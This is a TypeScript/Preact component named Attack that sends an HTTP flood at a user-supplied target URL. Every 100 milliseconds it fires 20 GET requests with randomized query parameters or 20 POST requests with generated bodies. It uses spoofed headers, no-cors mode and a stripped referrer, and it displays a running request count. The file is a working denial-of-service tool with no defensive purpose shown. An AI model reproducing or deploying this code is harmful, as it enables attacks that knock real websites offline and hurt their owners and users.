import { genBody } from '../utils/genBody';
import { genParam } from '../utils/genParam';
import { spoofHeaders } from '../utils/spoofHeaders';
import { fixURL } from './../utils/fixURL';
import { useState, useEffect } from 'preact/hooks';

export function Attack(props: { url: string; method: "GET" | "POST" }) {
    const [count, setCount] = useState(0);

    useEffect(() => {
        let count = 0
        const onFetchGET = async () => {
            await fetch(props.url + genParam(), {
                method: "GET",
                headers: spoofHeaders(),
                mode: "no-cors",
                cache: "no-cache",
                redirect: "follow",
                referrerPolicy: "no-referrer",
                body: null
            })
        }

        const body = genBody()

        const onFetchPOST = async () => {
            await fetch(props.url, {
                method: "POST",
                headers: spoofHeaders(),
                mode: "no-cors",
                cache: "no-cache",
                redirect: "follow",
                referrerPolicy: "no-referrer",
                body: body
            })
        }

        const interval = setInterval(async () => {

            if (props.method === "GET") {
                Array.from({ length: 20 }, onFetchGET)
            }else {
                Array.from({ length: 20 }, onFetchPOST)
            }

            count += 10;
            setCount(count)
        }, 100)
        return () => clearInterval(interval)
    }, [])

    return (
    <>
      <p>
        Target: <span>{fixURL(props.url)}</span>
      </p>
      <p>
        Method: <span>{props.method}</span>
      </p>
      <p>
        Count: <span>{count}</span>
      </p>
    </>
  );
}
